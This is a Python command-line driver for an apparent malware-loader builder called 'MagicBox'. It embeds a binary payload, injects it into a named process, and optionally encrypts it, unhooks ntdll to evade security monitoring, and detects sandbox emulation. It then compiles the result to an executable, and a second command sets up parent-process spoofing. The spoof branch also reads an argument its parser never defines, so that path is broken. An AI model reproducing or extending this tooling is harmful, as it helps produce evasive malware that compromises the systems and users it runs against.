import argparse
from helpers import constants
from magicBox import MagicBox, MagicBoxException

def parseArgs():
    parser = argparse.ArgumentParser()
    subparser = parser.add_subparsers(dest='command')
    generate = subparser.add_parser(constants.COMMAND_GENERATE)

    generate.add_argument('--payload', required=True, help="The file containing the binary payload to embed.")
    generate.add_argument('--injectionTarget', required=True, help="The name of the process to inject to.")
    generate.add_argument(
        '--encryption',
        choices=[e.name for e in constants.Encryption],
        required=False,
        help="The algorithm to use to encrypt the paylod. The payload will not be encrypted if this argument is not specified."
    )
    generate.add_argument(
        '--unhook', 
        choices=[e.name for e in constants.Unhooking], 
        required=False,
        help="The technique to use to remove hooks from ntdll."
    )
    generate.add_argument(
        '--detectEmulation', 
        required=False, 
        action='store_true',
        help="Attempts to detect emulation by studying the behavoir of commonly unimplemented win32 APIs."
    )

    generate.add_argument(
        '--format', 
        choices=[e.name for e in constants.Formats], 
        required=True,
        nargs='?',
        const=constants.Formats.exe,
        help="The format of the output."
    )
    
    spoof = subparser.add_parser(constants.COMMAND_SPOOF)
    spoof.add_argument('--parentProcess', required=True)
    spoof.add_argument('--childProcess', required=True)

    args = parser.parse_args()
    return args

def main():
    args = parseArgs()
    mb = MagicBox()

    try:
        if args.command == constants.COMMAND_GENERATE:
            mb.setPayload(args.payload)

            encryptionParameter = None if args.encryption is None else constants.Encryption[args.encryption]
            mb.setEncryption(encryptionParameter)

            if args.unhook != None:
                mb.setUnhooking(constants.Unhooking[args.unhook])

            mb.setInjection(constants.Injection.CLASSIC, args.injectionTarget)

            if args.detectEmulation:
                mb.setEmulation()

            mb.gatherGenerationCode(constants.Formats[args.format])        
            
        elif args.command == constants.COMMAND_SPOOF:
            mb.setPPIDSpoofing(args.parentProcess, args.childProcess)
            mb.gatherSpoofingCode(constants.Formats[args.format])        

        mb.writeCodeToFile(constants.RESULTING_EXECUTABLE_NAME)
        mb.compile()
        mb.cleanup()

    except MagicBoxException as mbException:
        print(f"{mbException}, aborting...")
        
if __name__ == "__main__":
    main()
